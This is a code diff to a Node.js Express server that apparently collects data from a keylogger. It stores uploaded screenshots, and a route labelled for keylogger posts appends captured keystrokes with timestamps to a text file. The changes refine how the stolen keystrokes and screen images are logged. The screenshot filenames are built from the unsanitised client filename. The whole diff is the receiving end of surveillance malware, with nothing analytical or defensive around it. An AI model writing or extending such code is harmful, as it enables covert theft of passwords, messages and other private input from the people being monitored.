@@ -13,14 +13,15 @@ app.use(bodyParser.json());
 // === Screenshot Upload Setup ===
 const storage = multer.diskStorage({
   destination: function (req, file, cb) {
-    const dir = "./uploads";
+    const dir = "./Screenshot Uploads";
     if (!fs.existsSync(dir)) fs.mkdirSync(dir);
     cb(null, dir);
   },
   filename: function (req, file, cb) {
-    const uniqueSuffix = Date.now() + "-" + Math.round(Math.random() * 1e9);
-    cb(null, uniqueSuffix + path.extname(file.originalname));
-  }
+    const timestamp = new Date().toISOString().replace(/[:.]/g, "_"); 
+    const newName = `${timestamp}_${file.originalname}`;
+    cb(null, newName);
+  } 
 });
 const upload = multer({ storage: storage });
 
@@ -38,8 +39,11 @@ app.get("/", (req, res) => {
 
 // POST from Keylogger
 app.post("/", (req, res) => {
-  console.log("[KEYLOG]", req.body.keyboardData);
-  fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");
+  const time = req.body.timestamp || "Unknown Time";
+  const data = req.body.keyboardData || "";
+
+  console.log(`[KEYLOG] ${time} - ${data}`);
+  fs.appendFileSync("keyboard_capture.txt", `${time} - ${data}\n`);
   res.send("Keyboard data received.");
 });
 
